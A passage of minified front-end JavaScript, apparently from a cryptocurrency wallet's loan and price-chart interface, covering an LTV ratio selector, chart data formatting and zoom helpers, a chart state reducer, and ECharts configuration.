              , c = (null == e || null === (t = e.loanCurrencies) || void 0 === t ? void 0 : t.loans) || []
              , u = (null == e || null === (a = e.loanCurrencies) || void 0 === a ? void 0 : a.deposit) || [];
            (0,
            O.useEffect)(( () => {
                var e;
                const t = u.find((e => (0,
                Ho.t)(e.currency) === (0,
                Ho.t)(null == s ? void 0 : s.currency) && (0,
                Ho.t)(e.network) === (0,
                Ho.t)((null == s ? void 0 : s.family) || (null == s ? void 0 : s.currency))))
                  , a = null === (e = (0,
                Ko.gt)(null == t ? void 0 : t.loan_deposit_min_amount, 0) ? null == t ? void 0 : t.loan_deposit_min_amount : null != t && t.loan_receive_min_amount ? (0,
                Ko.$q)(null == t ? void 0 : t.loan_receive_min_amount, 2) : null == t ? void 0 : t.loan_deposit_default_amount) || void 0 === e ? void 0 : e.toString()
                  , n = new (Sc())(a || 0).multipliedBy(1.1).toString();
                r(n)
            }
            ), [c, l, s, null == l ? void 0 : l.currency, null == s ? void 0 : s.currency, i, o]);
            return n
        }
          , c6 = "BorrowLTV_BorrowLTV_3cA-g"
          , u6 = "BorrowLTV_ltvOptions_mD85U"
          , d6 = "BorrowLTV_ltvButton_F9VqX"
          , m6 = "BorrowLTV_ltvButtonActive_29xPO"
          , p6 = "BorrowLTV_questionMark_2ed32"
          , f6 = "BorrowLTV_ltvNotice_1Lcwv"
          , E6 = "BorrowLTV_noticeWrapper__cY0Q"
          , h6 = "BorrowLTV_notice_E5kMq"
          , g6 = "BorrowLTV_box_7M_AB"
          , y6 = "BorrowLTV_infoText_2xH3E"
          , v6 = "BorrowLTV_additionalInfo_YqbGU"
          , _6 = "BorrowLTV_tooltipInfo_1Akd3"
          , w6 = "BorrowLTV_iconInfo_1pGSB"
          , b6 = "The loan-to-value ratio is the related difference between the loan\namount and the current market value of the collateral. The higher\nthe LTV, the more loan funds you will receive, but at the same\ntime the margin call will be higher."
          , BorrowLTV_BorrowLTV = e => {
            let {ltv: t, setLtv: a, ltvList: n} = e;
            return O.createElement("div", {
                className: c6
            }, O.createElement(misk_info_modern, null, O.createElement(misk_info_modern_MiskInfoTitle, {
                className: y6
            }, "LTV ", O.createElement(tooltip, {
                classNameWrapper: _6,
                text: b6,
                width: "300px"
            }, O.createElement("div", {
                dangerouslySetInnerHTML: {
                    __html: Yx()
                },
                className: w6
            }))), O.createElement(misk_info_modern_MiskInfoValue, {
                className: y6
            }, O.createElement("div", {
                className: u6
            }, n.map((e => O.createElement("div", {
                key: e,
                className: Ht()(d6, t === e && m6),
                onClick: () => a(e)
            }, new (Sc())(e).multipliedBy(100).toString(), "%")))))))
        }
          , k6 = 4
          , getOpenValue = e => {
            const t = e.map((e => e.y));
            return t.find((e => (0,
            Ko.gt)(e, 0))) || t[0]
        }
          , getMaxValuePosition = (e, t) => e < 10 ? "right" : e > t - 10 ? "left" : "top"
          , getMinValuePosition = (e, t, a) => e < 10 ? "right" : e > t - 10 || a.toString().includes("-10") ? "left" : "bottom"
          , handleXAxisDate = (e, t) => {
            const a = dateFormat(Math.floor(e), "d mmm HH:MM")
              , [n,r,l] = a.split(" ");
            if (t === PERIOD_DAY)
                return "00:00" === l ? `${r} ${n}, ${l}` : l;
            if (t === PERIOD_WEEK || t === PERIOD_MONTH)
                return `${r} ${n}`;
            const s = new Date(e)
              , i = new Date(e);
            i.setMonth(0);
            i.setDate(1);
            i.setHours(0);
            i.setMinutes(0);
            i.setSeconds(0);
            i.setMilliseconds(0);
            return s.getTime() === i.getTime() ? "{year|" + s.getFullYear() + "}" : `${r}`
        }
          , handleAxisPointerDate = (e, t) => {
            const a = date_format(Math.floor(e), 1 === t || 7 === t ? "d mmm HH:MM" : "d mmmm HH:MM")
              , [n,r,l] = a.split(" ");
            return 1 === t || 7 === t ? `${r} ${n}, ${l}` : `${r} ${n}`
        }
          , getDecimalsCount = e => {
            const t = {};
            e.forEach((e => {
                var a;
                const n = (null === (a = new (Sc())(e).toString().split(".")[1]) || void 0 === a ? void 0 : a.length) || 0;
                t[n] = t[n] ? t[n] + 1 : 1
            }
            ));
            const a = Object.keys(t);
            if (0 === a.length)
                return 4;
            if (a.length > 1 && 1 === t[+a[a.length - 1]]) {
                var n;
                return null !== (n = +a[a.length - 2]) && void 0 !== n ? n : 4
            }
            return +a[a.length - 1]
        }
          , S6 = {
            0: "⁰",
            1: "¹",
            2: "²",
            3: "³",
            4: "⁴",
            5: "⁵",
            6: "⁶",
            7: "⁷",
            8: "⁸",
            9: "⁹",
            10: "¹⁰",
            11: "¹¹",
            12: "¹²",
            13: "¹³",
            14: "¹⁴",
            15: "¹⁵",
            16: "¹⁶",
            17: "¹⁷",
            18: "¹⁸",
            19: "¹⁹",
            20: "²⁰",
            21: "²¹",
            22: "²²",
            23: "²³",
            24: "²⁴",
            25: "²⁵",
            26: "²⁶",
            27: "²⁷",
            28: "²⁸",
            29: "²⁹",
            "-": "⁻"
        }
          , formatYAxisLabel = function(e, t, a) {
            let n = arguments.length > 3 && void 0 !== arguments[3] && arguments[3]
              , r = (0,
            Ko.FH)(e, {
                min: t,
                max: t
            });
            if ((0,
            Ko.G)(r, 0))
                return "0";
            if (t > 30)
                return r;
            if (t > 4 && (0,
            Ko.lt)(e, 1e-4)) {
                const e = r.slice(2).split("").findIndex((e => +e > 0))
                  , t = (e + 1).toString(10);
                let a = r[2 + e];
                (0,
                Ko.gt)(r[3 + e], 4) && (a = (+a + 1).toString());
                return `${a} * 10${S6["-"]}${S6[t]}`
            }
            if ((0,
            Ko.gt)(a, 99999)) {
                const e = (0,
                Ko.FH)(r, {
                    max: 0
                });
                return `${e[0]},${e.slice(1, 4)} * 10${S6[e.length - 1]}`
            }
            const l = (0,
            Ko.FH)(r, {
                min: 4,
                max: 4
            });
            (0,
            Ko.gt)(t, 4) && (r = l);
            if (!n) {
                if ((0,
                Ko.gt)(r, 1e4)) {
                    const e = (0,
                    Ko.FH)((0,
                    Ko.hC)(r, 100), {
                        max: 0
                    });
                    r = (0,
                    Ko.FH)((0,
                    Ko.$q)(e, 100), {
                        min: t,
                        max: t
                    })
                } else if ((0,
                Ko.gt)(r, 1e3)) {
                    const e = (0,
                    Ko.FH)((0,
                    Ko.hC)(r, 10), {
                        max: 0
                    });
                    r = (0,
                    Ko.FH)((0,
                    Ko.$q)(e, 10), {
                        min: t,
                        max: t
                    })
                } else if ((0,
                Ko.gt)(r, 100)) {
                    const e = (0,
                    Ko.FH)(r, {
                        max: 0
                    });
                    r = (0,
                    Ko.FH)(e, {
                        min: t,
                        max: t
                    })
                }
                if ((0,
                Ko.eg)(t, 3)) {
                    const e = r[r.length - 1];
                    if ((0,
                    Ko.gt)(e, 4) && (0,
                    Ko.lt)(e, 9)) {
                        const e = (0,
                        Ko.PD)(r[r.length - 2], 1);
                        r = r.slice(0, r.length - 2) + e.toString() + "0"
                    } else
                        r = r.slice(0, r.length - 1) + "0"
                }
            }
            return r
        }
          , utils_getOffset = e => (0,
        Ko.eg)(e, .1) ? .06 : (0,
        Ko.eg)(e, .05) && (0,
        Ko.lt)(e, .1) ? .02 : +(0,
        Ko.h9)(e, (0,
        Ko.hC)(e, 1.2))
          , getYaxisData = (e, t) => {
            const a = +(0,
            Ko.hC)((0,
            Ko.h9)(t, e), t)
              , n = utils_getOffset(a)
              , r = +(0,
            Ko.PD)(t, (0,
            Ko.$q)(t, n))
              , l = +(0,
            Ko.h9)(e, (0,
            Ko.$q)(t, n))
              , s = undefined;
            return {
                min: l,
                max: r,
                interval: +(0,
                Ko.hC)((0,
                Ko.h9)(r, l), 6)
            }
        }
          , getCurrentChartData = (e, t) => {
            const a = e.map((e => e.y))
              , n = t || getDecimalsCount(a)
              , r = undefined
              , l = undefined;
            return {
                openValue: +(0,
                Ko.FH)(getOpenValue(e), {
                    min: n,
                    max: n
                }),
                currentValue: (0,
                Ko.FH)(a[a.length - 1], {
                    min: n,
                    max: n
                }),
                decimals: n
            }
        }
          , getCurrentDate = e => e || "24 H"
          , getCurrentPeriodDesc = e => {
            if (!e)
                return "-";
            switch (e) {
            case 1:
                return "24H";
            case 7:
                return "Past week";
            case H9:
                return "Past month";
            case z9:
                return "Past 6 months";
            case j9:
                return "Past year";
            default:
                return "-"
            }
        }
          , getDiff = (e, t) => {
            if (!e || !t)
                return "Infinity";
            const a = (0,
            Ko.h9)(100, (0,
            Ko.$q)((0,
            Ko.hC)(t, e), 100));
            return (0,
            Ko.FH)(a, {
                min: 2,
                max: 2
            })
        }
          , getCurrentDiff = e => getDiff(+(null == e ? void 0 : e.currentValue), e.firstValue)
          , isValueOverlapOpenValue = (e, t, a, n) => {
            const r = multipliedBy(minus(n, a), .07);
            return !(e > +plus(t, r) || e < +minus(t, r))
        }
          , getCurrencyTitle = e => {
            const t = (0,
            be.II)(e)
              , a = (0,
            be.xG)(e)
              , n = undefined;
            return `${t ? t.title : a} (${a})`
        }
          , C6 = {
            1: 24e4,
            7: 18e5,
            [H9]: 72e5,
            [z9]: 432e5,
            [j9]: 864e5
        }
          , handleChartData = (e, t, a) => {
            const n = []
              , r = []
              , l = []
              , s = []
              , i = []
              , o = []
              , c = e.map((e => e.y))
              , u = getDecimalsCount(c);
            for (let c = 0; c < e.length; c++) {
                var d, m;
                if (!(0,
                Ko.eq)(e[c].y, 0)) {
                    n.push(e[c].x);
                    r.push(+(0,
                    Ko.FH)(e[c].y, {
                        min: u,
                        max: u
                    }));
                    l.push([n[n.length - 1], r[r.length - 1]]);
                    o.push([n[n.length - 1], t]);
                    s.push([n[n.length - 1], r[r.length - 1]]);
                    (0,
                    Ko.eq)(r[r.length - 1], t) ? i.push([n[n.length - 1], r[r.length - 1]]) : i.push([null, null]);
                    if ((0,
                    Ko.gt)(e[c].y, t) && (0,
                    Ko.lt)(null === (d = e[c + 1]) || void 0 === d ? void 0 : d.y, t) || (0,
                    Ko.lt)(e[c].y, t) && (0,
                    Ko.gt)(null === (m = e[c + 1]) || void 0 === m ? void 0 : m.y, t)) {
                        r.push(+(0,
                        Ko.FH)(t, {
                            min: u,
                            max: u
                        }));
                        const e = +(0,
                        Ko.PD)(n[n.length - 1], C6[a]);
                        i.push([e, t]);
                        l.push([e, t]);
                        o.push([e, t]);
                        n.push(e)
                    }
                }
            }
            return {
                values: r,
                chartPoints: l.sort(( (e, t) => e[0] - t[0])),
                decimals: u,
                openValueData: o,
                chartPointsForZoom: s,
                openValueLine: i
            }
        }
          , getChartGridWidthPercent = e => (0,
        M.d)() && e ? "95%" : (0,
        M.d)() ? "94%" : e ? "81%" : "89%"
          , getChartGridLeftPadding = e => (0,
        M.d)() && e ? 15 : (0,
        M.d)() ? 27 : 42
          , getChartWidth = e => (0,
        M.d)() ? "100%" : e ? 450 : 748
          , getChartHeight = e => (0,
        M.d)() && e ? 330 : (0,
        M.d)() ? 630 : e ? 252 : 480
          , getChartMargin = e => (0,
        M.d)() ? "0 20px 0 0" : e ? "10px 0 0 -38px" : "0 0 0 -38px"
          , getChartPadding = () => (0,
        M.d)() ? "0 20px 0 15px" : ""
          , getAxisLabelMargin = e => (0,
        M.d)() && e ? -290 : (0,
        M.d)() ? -523 : e ? -225 : -383
          , formatDayXaxis = e => 1 === e ? "{MMM} {d}, {HH}:{mm}" : 7 === e || e === H9 ? "{MMM} {d}" : "{d}"
          , calculateMinZoomSpan = e => {
            switch (e) {
            case 1:
                return 144e5;
            case 7:
                return 648e5;
            case H9:
                return 3456e5;
            case z9:
                return 1296e6;
            case j9:
                return 3456e6;
            default:
                return 864e5
            }
        }
          , handleZoomedChartSeries = (e, t, a, n) => {
            const r = Math.round(e.length * (a / 100))
              , l = Math.round(e.length * (n / 100)) - 1
              , {startValue: s, endValue: i} = t.dataZoom[0]
              , o = e.find((e => (0,
            Ko.eq)(e.x, s)))
              , c = e.find((e => (0,
            Ko.eq)(e.x, i)))
              , u = Boolean(o) ? s + 1e3 : s
              , d = Boolean(c) ? i - 1e3 : i
              , m = e[r].y
              , p = e[l].y
              , f = e[0].y
              , E = t.series[0].data.filter((e => !e.isAddedAfterZoom));
            E.push({
                itemStyle: {
                    color: "#7190eb"
                },
                value: [u, m],
                isAddedAfterZoom: !0
            });
            E.push({
                itemStyle: {
                    color: "#7190eb"
                },
                value: [d, p],
                isAddedAfterZoom: !0
            });
            t.series[0].data = E.sort(( (e, t) => +e.value[0] - +t.value[0]));
            const h = t.series[1].data.filter((e => {
                var t;
                return !(null !== (t = e[2]) && void 0 !== t && t.isAddedAfterZoom)
            }
            ))
              , g = (0,
            Ko.gt)(m, f) ? f : m;
            h.push([u, g, {
                isAddedAfterZoom: !0
            }]);
            const y = (0,
            Ko.gt)(p, f) ? f : p;
            h.push([d, y, {
                isAddedAfterZoom: !0
            }]);
            t.series[1].data = h.sort(( (e, t) => e[0] - t[0]));
            const v = t.series[2].data.filter((e => {
                var t;
                return !(null !== (t = e[2]) && void 0 !== t && t.isAddedAfterZoom)
            }
            ))
              , _ = (0,
            Ko.lt)(m, f) ? 0 : +(0,
            Ko.h9)(m, f);
            v.push([u, _, {
                isAddedAfterZoom: !0
            }]);
            const w = (0,
            Ko.lt)(p, f) ? 0 : +(0,
            Ko.h9)(p, f);
            v.push([d, w, {
                isAddedAfterZoom: !0
            }]);
            t.series[2].data = v.sort(( (e, t) => e[0] - t[0]));
            const b = t.series[3].data.filter((e => {
                var t;
                return !(null !== (t = e[2]) && void 0 !== t && t.isAddedAfterZoom)
            }
            ))
              , k = (0,
            Ko.lt)(m, f) ? m : f;
            b.push([u, k, {
                isAddedAfterZoom: !0
            }]);
            const S = (0,
            Ko.lt)(p, f) ? p : f;
            b.push([d, S, {
                isAddedAfterZoom: !0
            }]);
            t.series[3].data = b.sort(( (e, t) => e[0] - t[0]));
            const C = t.series[4].data.filter((e => {
                var t;
                return !(null !== (t = e[2]) && void 0 !== t && t.isAddedAfterZoom)
            }
            ))
              , N = (0,
            Ko.gt)(m, f) ? 0 : +(0,
            Ko.h9)(f, m);
            C.push([u, N, {
                isAddedAfterZoom: !0
            }]);
            const T = (0,
            Ko.gt)(p, f) ? 0 : +(0,
            Ko.h9)(f, p);
            C.push([d, T, {
                isAddedAfterZoom: !0
            }]);
            t.series[4].data = C.sort(( (e, t) => e[0] - t[0]));
            const A = t.series[7].data.filter((e => {
                var t;
                return !(null !== (t = e[2]) && void 0 !== t && t.isAddedAfterZoom)
            }
            ));
            A.push([u, f, {
                isAddedAfterZoom: !0
            }]);
            A.push([d, f, {
                isAddedAfterZoom: !0
            }]);
            t.series[7].data = A.sort(( (e, t) => e[0] - t[0]));
            const x = t.series[8].data.filter((e => !e.isAddedAfterZoom));
            (0,
            Ko.eq)(m, f) && x.unshift({
                itemStyle: {
                    color: "#7190eb"
                },
                value: [u, m],
                isAddedAfterZoom: !0
            });
            (0,
            Ko.eq)(p, f) && x.push({
                itemStyle: {
                    color: "#7190eb"
                },
                value: [d, p],
                isAddedAfterZoom: !0
            });
            t.series[8].data = x;
            return t
        }
          , getTopBorderColor = e => e ? (0,
        M.d)() ? "#222223" : "#303132" : "#fff"
          , N6 = {
            period: H9,
            decimals: 4,
            isWalletChanged: !1,
            chartOptions: {
                mainChartOptions: null,
                zoomChartOptions: null
            },
            currentChartValues: {
                currentSelectedValue: null,
                currentSelectedDate: null,
                currentDiffPercent: null,
                periodDescription: getCurrentPeriodDesc(H9),
                zoomState: {
                    zoomStart: 0,
                    zoomEnd: 100
                }
            }
        };
        let T6;
        !function(e) {
            e[e.SET_CHART_DATA = 0] = "SET_CHART_DATA";
            e[e.SET_CURRENT_CHART_VALUES = 1] = "SET_CURRENT_CHART_VALUES";
            e[e.SET_CHART_OPTIONS = 2] = "SET_CHART_OPTIONS";
            e[e.SET_PERIOD = 3] = "SET_PERIOD";
            e[e.SET_DECIMALS = 4] = "SET_DECIMALS";
            e[e.SET_IS_WALLET_CHANGED = 5] = "SET_IS_WALLET_CHANGED";
            e[e.SET_LAST_VALUE_AS_CURRENT = 6] = "SET_LAST_VALUE_AS_CURRENT";
            e[e.SET_ZOOM_STATE = 7] = "SET_ZOOM_STATE"
        }(T6 || (T6 = {}));
        const chartReducer = (e, t) => {
            switch (t.type) {
            case T6.SET_CHART_DATA:
                return {
                    ...e,
                    chartOptions: {
                        ...t.payload.chartOptions
                    },
                    currentChartValues: {
                        ...t.payload.chartValues
                    }
                };
            case T6.SET_CHART_OPTIONS:
                return {
                    ...e,
                    chartOptions: t.payload
                };
            case T6.SET_CURRENT_CHART_VALUES:
                return {
                    ...e,
                    currentChartValues: {
                        ...e.currentChartValues,
                        ...t.payload
                    }
                };
            case T6.SET_PERIOD:
                return {
                    ...e,
                    period: t.payload
                };
            case T6.SET_DECIMALS:
                return {
                    ...e,
                    decimals: t.payload
                };
            case T6.SET_IS_WALLET_CHANGED:
                return {
                    ...e,
                    isWalletChanged: t.payload
                };
            case T6.SET_LAST_VALUE_AS_CURRENT:
                return {
                    ...e,
                    currentChartValues: {
                        ...e.currentChartValues,
                        currentSelectedValue: e.currentChartValues.lastValue
                    }
                };
            default:
                return e
            }
        }
          , A6 = O.createContext({
            state: N6,
            dispatch: () => {}
        })
          , EChartProvider = e => {
            let {children: t} = e;
            const [a,n] = (0,
            O.useReducer)(chartReducer, N6)
              , r = {
                state: a,
                dispatch: n
            };
            return O.createElement(A6.Provider, {
                value: r
            }, t)
        }
        ;
        function useEChartContext() {
            const e = O.useContext(A6)
              , {state: t, dispatch: a} = e;
            return {
                state: t,
                dispatch: a
            }
        }
        const x6 = "echart_wrapper_3_ubz main_block_15zml"
          , I6 = "echart_smallChartWrapper_3Ydk4"
          , P6 = "echart_loanElectron_2m900"
          , L6 = "echart_isVisible_3Dk6t"
          , F6 = "echart_chartWrapper_3DGXS"
          , W6 = "echart_periods_3FEWN"
          , R6 = "echart_periodsLoading_17ORz"
          , B6 = "echart_periodsSmallChart_2w0aL"
          , O6 = "echart_periodsNoData_2SJDG"
          , D6 = "echart_ticker_2erIB"
          , M6 = "echart_tickerLoader_OIzKL"
          , U6 = "echart_isActive_1Ghau"
          , G6 = "echart_titleWrapper_1Wto9"
          , V6 = "echart_currentPrice_2hs6N"
          , K6 = "echart_loadingBlock_162BU"
          , H6 = "echart_currentPriceLoading_23h1p"
          , z6 = "echart_currenPriceChange_nwCmu"
          , j6 = "echart_currenPriceChangeLoading_2xSNS"
          , $6 = "echart_percent_17OW5"
          , Z6 = "echart_percentMinus_X64m7"
          , Y6 = "echart_percentPlus_1ylFi"
          , q6 = "echart_periodDiff_17OSo"
          , X6 = "echart_loader_OtxEc"
          , Q6 = "echart_await__pWOx"
          , J6 = "echart_awaitZoom_2GyJM"
          , e8 = "echart_awaitSmallChart_72urq"
          , t8 = "echart_hasNoData_wwyum"
          , a8 = "echart_hasNoDataSmallChart_1zsSx"
          , n8 = "echart_blur_3zDDk"
          , Loading = e => {
            let {isVisible: t, hasData: a, currency: n, isWalletChanged: r, period: l, isSmallChart: s} = e
              , i = "";
            n && (i = getCurrencyTitle(n));
            return O.createElement(O.Fragment, null, O.createElement("div", {
                className: G6
            }, O.createElement("div", null, O.createElement("div", {
                className: Ht()(V6, H6, K6)
            }), O.createElement("div", {
                className: Ht()(z6, j6, K6)
            })), O.createElement("div", null, O.createElement("div", {
                className: D6
            }, r ? O.createElement("div", {
                className: Ht()(M6, K6)
            }) : i), O.createElement("div", {
                className: Ht()(W6, {
                    [R6]: r,
                    [O6]: !a,
                    [B6]: s
                })
            }, O.createElement("div", {
                className: Ht()({
                    [U6]: 1 === l
                })
            }, "1D"), O.createElement("div", {
                className: Ht()({
                    [U6]: 7 === l
                })
            }, "1W"), O.createElement("div", {
                className: Ht()({
                    [U6]: l === H9
                })
            }, "1M"), O.createElement("div", {
                className: Ht()({
                    [U6]: l === z9
                })
            }, "6M"), O.createElement("div", {
                className: Ht()({
                    [U6]: l === j9
                })
            }, "1Y")))), O.createElement("div", {
                className: Ht()(Q6, {
                    [L6]: t,
                    [e8]: s
                })
            }), !a && O.createElement("div", {
                className: Ht()(t8, {
                    [a8]: s
                })
            }, "Information is not available now"))
        }
        ;
        var r8 = a(73380)
          , l8 = a.n(r8)
          , s8 = a(39426);
        const getMainChartOptions = (e, t, a, n) => {
            const r = getOpenValue(e)
              , {chartPoints: l, values: s, openValueData: i, decimals: o, openValueLine: c} = handleChartData(e, r, t)
              , u = Math.max(...s)
              , d = Math.min(...s)
              , m = s.indexOf(+u.toString())
              , p = s.indexOf(+d.toString())
              , f = getMinValuePosition(p, s.length, d)
              , E = getMaxValuePosition(m, s.length)
              , h = (0,
            Ko.eq)(d, u)
              , {min: g, max: y, interval: v} = getYaxisData(d, u);
            let _ = 0;
            return {
                animation: !1,
                dataset: [{
                    source: [l]
                }],
                grid: {
                    height: "75%",
                    bottom: 0,
                    top: 30,
                    z: 81,
                    left: getChartGridLeftPadding(n),
                    width: getChartGridWidthPercent(n),
                    show: !1,
                    borderWidth: 3,
                    containLabel: !1,
                    borderColor: a ? (0,
                    M.d)() ? "#222223" : "#303132" : "#fff"
                },
                height: 215,
                tooltip: {
                    show: !1,
                    transitionDuration: 0
                },
                axisPointer: {
                    show: !0,
                    triggerTooltip: !0,
                    lineStyle: {
                        color: "#7190EB"
                    },
                    label: {
                        show: !0,
                        formatter: e => handleAxisPointerDate(e.value, t),
                        rich: {
                            year: {
                                fontWeight: "bold"
                            }
                        },
                        margin: getAxisLabelMargin(n),
                        color: a ? "rgb(214, 214, 214, 0.5)" : "rgb(69, 90, 100, 0.5)",
                        fontSize: 13,
                        fontFamily: "Roboto",
                        backgroundColor: "transparent"
                    },
                    snap: !0,
                    z: 85
                },
                xAxis: [{
                    type: "time",
                    splitNumber: n && !(0,
                    M.d)() ? 3 : 5,
                    axisTick: {
                        show: !0,
                        lineStyle: {
                            join: "miter",
                            miterLimit: 1
                        }
                    },
                    boundaryGap: !1,
                    axisLine: {
                        lineStyle: {
                            color: a ? "#454547" : "rgba(196, 196, 196, 1)"
                        },
                        onZero: !0
                    },
                    splitLine: {
                        show: !1
                    },
                    offset: 0,
                    z: 90,
                    min: "dataMin",
                    max: "dataMax",
                    axisLabel: {
                        showMaxLabel: !1,
                        showMinLabel: !1,
                        color: a ? "#D6D6D6" : "rgba(151, 151, 151, 1)",
                        fontFamily: "Roboto",
                        fontWeight: 400,
                        fontStyle: "normal",
                        fontSize: 10,
                        hideOverlap: !1,
                        verticalAlign: "top",
                        height: 18,
                        formatter: {
                            year: "{yyyy}",
                            month: "{MMM}",
                            day: formatDayXaxis(t),
                            hour: "{HH}:{mm}",
                            minute: "{HH}:{mm}",
                            second: "{HH}:{mm}:{ss}",
                            millisecond: "{hh}:{mm}:{ss} {SSS}"
                        }
                    }
                }, {
                    type: "time",
                    splitNumber: n ? 3 : 6,
                    axisTick: {
                        show: !1
                    },
                    boundaryGap: ["0%", "0%"],
                    axisLine: {
                        lineStyle: {
                            color: getTopBorderColor(a),
                            width: 2
                        },
                        onZero: !0
                    },
                    position: "top",
                    splitLine: {
                        show: !1
                    },
                    offset: -1,
                    z: 90,
                    min: "dataMin",
                    max: "dataMax",
                    axisLabel: {
                        show: !1,
                        formatter: () => {
                            _ = 0;
                            return ""
                        }
                    }
                }],
                yAxis: {
                    type: "value",
                    scale: !0,
                    z: 80,
                    offset: 5,
                    position: "right",
                    boundaryGap: h || n ? ["10%", "10%"] : ["7%", "7%"],
                    splitNumber: n ? 4 : 7,
                    axisLine: {
                        onZero: !0
                    },
                    min: n ? g : void 0,
                    max: n ? y : void 0,
                    interval: n ? v : void 0,
                    splitLine: {
                        lineStyle: {
                            color: a ? "#454547" : "#C4C4C4",
                            opacity: .3
                        }
                    },
                    axisLabel: {
                        color: a ? "#D6D6D6" : "rgba(151, 151, 151, 1)",
                        fontFamily: "Roboto",
                        inside: !0,
                        fontWeight: 400,
                        fontStyle: "normal",
                        fontSize: 10,
                        backgroundColor: "transparent",
                        showMinLabel: !1,
                        showMaxLabel: !1,
                        hideOverlap: !0,
                        padding: 2,
                        borderRadius: 3,
                        formatter: e => {
                            _++;
                            return 7 === _ && !h && n ? "" : formatYAxisLabel(e.toString(10), o, u)
                        }
                    },
                    axisPointer: {
                        show: !1
                    }
                },
                dataZoom: [{
                    type: "slider",
                    id: "main",
                    show: !n,
                    borderColor: "rgba(113, 144, 235, 0)",
                    backgroundColor: "rgba(113, 144, 235, 0)",
                    handleSize: 37,
                    handleStyle: {
                        borderWidth: a ? 0 : 1,
                        borderColor: "rgba(113, 144, 235, 0.25)"
                    },
                    minValueSpan: calculateMinZoomSpan(t),
                    brushSelect: !1,
                    filterMode: "filter",
                    fillerColor: a ? "rgba(113, 144, 235, 0.5)" : "rgba(113, 144, 235, 0.25)",
                    dataBackground: {
                        areaStyle: {
                            opacity: 0
                        },
                        lineStyle: {
                            opacity: 0
                        }
                    },
                    selectedDataBackground: {
                        areaStyle: {
                            opacity: 0,
                            color: "rgba(113, 144, 235, 1)"
                        },
                        lineStyle: {
                            opacity: 0
                        }
                    },
                    showDetail: !1,
                    height: 58,
                    bottom: (0,
                    M.d)() ? 31 : 0,
                    width: (0,
                    M.d)() ? "95%" : 670,
                    left: (0,
                    M.d)() ? 20 : 36,
                    throttle: 100,
                    emphasis: {
                        handleStyle: {
                            borderColor: "rgba(113, 144, 235, 0.25)"
                        }
                    }
                }],
                series: [{
                    type: "line",
                    symbol: "circle",
                    name: "main-line",
                    silent: !0,
                    universalTransition: !0,
                    animationDurationUpdate: 1e3,
                    emphasis: {
                        disabled: !0
                    },
                    id: "main",
                    showSymbol: !1,
                    z: 70,
                    symbolSize: 10,
                    itemStyle: {
                        borderColor: a ? "#303132" : "#fff",
                        borderWidth: 2,
                        color: "#7190eb"
                    },
                    triggerLineEvent: !0,
                    data: l.map((e => ({
                        value: e,
                        itemStyle: {
                            color: "#7190eb"
                        }
                    })))
                }, {
                    name: "raise-shadow",
                    type: "line",
                    data: l.map((e => (0,
                    Ko.gt)(e[1], r) ? [e[0], r] : e)),
                    lineStyle: {
                        opacity: 0
                    },
                    stack: "raise-shadow",
                    symbol: "none"
                }, {
                    name: "raise-shadow",
                    type: "line",
                    data: l.map((e => (0,
                    Ko.lt)(e[1], r) ? [e[0], 0] : [e[0], +(0,
                    Ko.h9)(e[1], r)])),
                    lineStyle: {
                        opacity: 0
                    },
                    areaStyle: {
                        color: new s8.Q.o(0,0,0,1,[{
                            offset: 0,
                            color: "rgba(100, 183, 72, 0.2)"
                        }, {
                            offset: 1,
                            color: "rgba(215, 244, 231, 0)"
                        }])
                    },
                    stack: "raise-shadow",
                    symbol: "none"
                }, {
                    name: "fall-shadow",
                    type: "line",
                    data: l.map((e => (0,
                    Ko.lt)(e[1], r) ? e : [e[0], r])),
                    lineStyle: {
                        opacity: 0
                    },
                    stack: "fall-shadow",
                    symbol: "none"
                }, {
                    name: "fall-shadow",
                    type: "line",
                    data: l.map((e => (0,
                    Ko.gt)(e[1], r) ? [e[0], 0] : [e[0], +(0,
                    Ko.h9)(r, e[1])])),
                    lineStyle: {
                        opacity: 0
                    },
                    areaStyle: {
                        color: new s8.Q.o(0,0,0,1,[{
                            offset: 0,
                            color: "rgba(229, 57, 53, 0)"
                        }, {
                            offset: 1,
                            color: "rgba(229, 57, 53, 0.3)"
                        }])
                    },
                    stack: "fall-shadow",
                    symbol: "none"
                }, {
                    name: "max-point",
                    type: "scatter",
                    symbolSize: 10,
                    z: 110,
                    itemStyle: {
                        opacity: ((0,
                        Ko.eq)(l[m][1], l[l.length - 1][1]),
                        1),
                        color: "#55B64E"
                    },
                    label: {
                        show: !0,
                        position: E,
                        color: "#55B64E",
                        fontSize: n ? 10 : 12,
                        fontFamily: n ? "Roboto" : "sans-serif",
                        fontWeight: n ? 400 : "normal",
                        fontStyle: "normal",
                        formatter: e => {
                            const t = e.value;
                            return formatYAxisLabel(t[1].toString(10), o, u, !0)
                        }
                    },
                    emphasis: {
                        disabled: !0
                    },
                    data: [l[m]]
                }, {
                    name: "min-point",
                    type: "scatter",
                    symbolSize: 10,
                    z: 110,
                    itemStyle: {
                        opacity: ((0,
                        Ko.eq)(l[p][1], l[l.length - 1][1]),
                        1),
                        color: "#E53935"
                    },
                    label: {
                        show: !0,
                        position: f,
                        color: "#E53935",
                        fontSize: n ? 10 : 12,
                        fontFamily: n ? "Roboto" : "sans-serif",
                        fontWeight: n ? 400 : "normal",
                        fontStyle: "normal",
                        formatter: e => {
                            const t = e.value;
                            return formatYAxisLabel(t[1].toString(10), o, u, !0)
                        }
                    },
                    emphasis: {
                        disabled: !0
                    },
                    data: [l[p]]
                }, {
                    name: "mark-line",
                    type: "line",
                    z: 20,
                    silent: !0,
                    emphasis: {
                        disabled: !0
                    },
                    select: {
                        disabled: !0
                    },
                    cursor: "default",
                    symbol: "none",
                    showSymbol: !1,
                    lineStyle: {
                        width: 2,
                        cap: "round",
                        color: a ? "#454547" : "#E4E4E4",
                        type: "dashed"
                    },
                    data: i
                }, {
                    name: "mark-line-open-value",
                    type: "line",
                    z: 100,
                    silent: !0,
                    emphasis: {
                        disabled: !0
                    },
                    select: {
                        disabled: !0
                    },
                    cursor: "default",
                    symbol: "circle",
                    showSymbol: !1,
                    symbolSize: 10,
                    itemStyle: {
                        borderColor: a ? "#303132" : "#fff",
                        borderWidth: 2,
                        color: "#7190eb"
                    },
                    lineStyle: {
                        width: 2,
                        cap: "square",
                        color: "#55b64e",
                        join: "miter",
                        miterLimit: 20
                    },
                    data: c.map((e => ({
                        value: e,
                        itemStyle: {
                            color: "#7190eb"
                        }
                    })))
                }],
                visualMap: {
                    type: "piecewise",
                    show: !1,
                    seriesIndex: [0, 1, 2, 3],
                    id: "main",
                    z: 70,
                    pieces: [{
                        gt: 0,
                        lt: r,
                        color: "#e53935"
                    }, {
                        gte: r,
                        lte: u,
